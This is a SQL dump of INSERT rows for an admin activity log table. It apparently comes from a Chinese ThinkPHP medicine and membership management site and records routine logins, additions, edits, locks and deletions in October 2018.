INSERT INTO `xy_log` VALUES ('82', '2018-10-24 15:58:01', 'admin', '新增成功220', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('83', '2018-10-24 16:34:56', 'admin', '退出成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('84', '2018-10-24 16:35:03', 'user1', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('85', '2018-10-24 16:35:15', 'user1', '退出成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/logout.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('86', '2018-10-24 16:35:23', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('87', '2018-10-24 17:02:04', 'admin', '新增成功26', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('88', '2018-10-24 17:03:07', 'admin', '新增成功27', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('89', '2018-10-24 17:03:30', 'admin', '新增成功28', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('90', '2018-10-25 10:14:19', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('91', '2018-10-25 10:35:17', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Case/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('92', '2018-10-25 10:37:25', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Case/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('93', '2018-10-25 10:38:08', 'admin', '编辑成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Case/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('94', '2018-10-25 10:38:29', 'admin', '编辑成功2', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Case/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('95', '2018-10-25 10:44:45', 'admin', '编辑成功220', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('96', '2018-10-25 10:45:38', 'admin', '新增成功221', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('97', '2018-10-25 10:46:20', 'admin', '编辑成功221', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('98', '2018-10-25 10:47:45', 'admin', '编辑成功221', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('99', '2018-10-25 10:53:12', 'admin', '锁定221', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('100', '2018-10-25 11:08:57', 'admin', '新增成功222', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('101', '2018-10-25 11:10:21', 'admin', '新增成功223', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('102', '2018-10-25 11:11:20', 'admin', '编辑成功222', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('103', '2018-10-25 11:35:06', 'admin', '新增成功224', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('104', '2018-10-25 11:43:42', 'admin', '编辑成功224', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('105', '2018-10-25 11:46:30', 'admin', '编辑成功224', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('106', '2018-10-25 11:47:27', 'admin', '编辑成功222', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('107', '2018-10-25 11:59:38', 'admin', '新增成功225', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('108', '2018-10-25 13:04:44', 'admin', '编辑成功225', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('109', '2018-10-25 13:05:20', 'admin', '编辑成功225', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('110', '2018-10-25 13:09:47', 'admin', '编辑成功225', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('111', '2018-10-25 13:10:48', 'admin', '编辑成功225', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('112', '2018-10-25 13:23:21', 'admin', '锁定1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('113', '2018-10-25 13:53:46', 'admin', '新增成功9', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('114', '2018-10-25 13:54:02', 'admin', '新增成功10', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('115', '2018-10-25 13:55:13', 'admin', '新增成功226', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('116', '2018-10-25 16:19:48', 'admin', '新增成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('117', '2018-10-25 17:05:57', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('118', '2018-10-25 17:18:25', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('119', '2018-10-25 17:20:41', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('120', '2018-10-25 17:21:58', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('121', '2018-10-25 17:23:40', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('122', '2018-10-25 17:24:30', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('123', '2018-10-25 17:24:47', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('124', '2018-10-25 17:27:30', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('125', '2018-10-25 17:28:56', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('126', '2018-10-25 17:29:39', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('127', '2018-10-25 17:30:57', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('128', '2018-10-25 17:31:38', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('129', '2018-10-25 17:32:08', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('130', '2018-10-25 17:32:19', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('131', '2018-10-25 17:33:13', 'admin', '锁定3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Cust/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('132', '2018-10-25 17:33:29', 'admin', '锁定2', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Cust/lock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('133', '2018-10-25 17:34:00', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('134', '2018-10-25 17:36:27', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('135', '2018-10-25 17:41:59', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('136', '2018-10-25 17:42:45', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('137', '2018-10-25 17:43:16', 'admin', '设置成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('138', '2018-10-25 17:45:34', 'admin', '删除成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('139', '2018-10-25 17:46:52', 'admin', '新增成功2', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('140', '2018-10-25 17:46:58', 'admin', '删除成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('141', '2018-10-25 17:49:37', 'admin', '文件未上传成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('142', '2018-10-25 17:49:44', 'admin', '文件未上传成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('143', '2018-10-25 17:49:54', 'admin', '新增成功3', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('144', '2018-10-26 08:28:42', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('145', '2018-10-26 08:49:25', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('146', '2018-10-26 08:52:21', 'admin', '新增成功4', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('147', '2018-10-26 08:52:43', 'admin', '删除成功1', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/delete.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('148', '2018-10-26 09:09:35', 'admin', '新增成功227', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('149', '2018-10-26 14:41:42', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('150', '2018-10-26 15:01:29', 'admin', '锁定19', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/filelock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('151', '2018-10-26 15:01:36', 'admin', '启用19', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/filelock.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('152', '2018-10-26 15:09:56', 'admin', '编辑成功227', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('153', '2018-10-29 08:29:42', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('154', '2018-10-29 10:46:14', 'admin', '核销成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/clear.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('155', '2018-10-29 10:46:37', 'admin', '核销失败,数量超过库存', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/clear.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('156', '2018-10-29 10:52:47', 'admin', '清理3条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('157', '2018-10-29 10:53:06', 'admin', '清理0条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('158', '2018-10-29 11:15:58', 'admin', '新增成功228', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('159', '2018-10-29 11:45:38', 'admin', '新增成功229', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('160', '2018-10-29 11:46:34', 'admin', '编辑成功229', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('161', '2018-10-29 16:22:48', 'admin', '编辑成功229', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('162', '2018-10-30 08:37:11', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('163', '2018-10-30 13:51:50', 'admin', '新增成功11', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('164', '2018-10-30 14:10:07', 'admin', '新增成功12', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('165', '2018-10-30 14:11:12', 'admin', '新增成功11', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('166', '2018-10-30 14:11:37', 'admin', '新增成功12', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Mtype/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('167', '2018-10-30 14:33:52', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Medicine/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('168', '2018-10-30 14:35:57', 'admin', '新增成功13', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('169', '2018-10-30 14:43:35', 'admin', '清理0条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('170', '2018-10-30 14:46:26', 'admin', '新增成功14', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('171', '2018-10-30 15:11:47', 'admin', '编辑成功9', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('172', '2018-10-30 17:18:17', 'admin', '清理0条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('173', '2018-10-30 17:19:32', 'admin', '清理0条无用的记录', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('174', '2018-10-30 17:27:29', 'admin', '删除成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Project/del.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('175', '2018-10-30 18:11:22', 'admin', '新增成功230', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/add.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('176', '2018-10-31 08:43:38', 'admin', '登录成功！', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Public/Login.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('177', '2018-10-31 09:13:26', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('178', '2018-10-31 09:55:00', 'admin', '编辑成功216', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('179', '2018-10-31 09:55:21', 'admin', '编辑成功219', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Menu/edit.html', '0.0.0.0');
INSERT INTO `xy_log` VALUES ('180', '2018-10-31 10:22:11', 'admin', '编辑成功', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100', '/weiling/index.php?s=/Home/Member/edit.html', '0.0.0.0');
